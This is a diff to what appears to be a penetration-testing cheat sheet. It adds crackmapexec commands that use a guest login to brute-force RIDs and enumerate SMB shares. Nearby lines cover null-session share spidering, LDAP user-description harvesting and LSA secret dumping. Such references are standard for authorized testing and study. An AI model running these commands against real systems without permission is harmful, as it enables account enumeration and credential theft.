@@ -133,6 +133,10 @@ $ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=fals
 $ crackmapexec smb <RHOST> -u " " -p "" --shares
 $ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus
 $ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
+$ crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute
+$ crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
+$ crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
+$ crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute 100000
 $ crackmapexec ldap <RHOST> -u '' -p '' -M get-desc-users
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
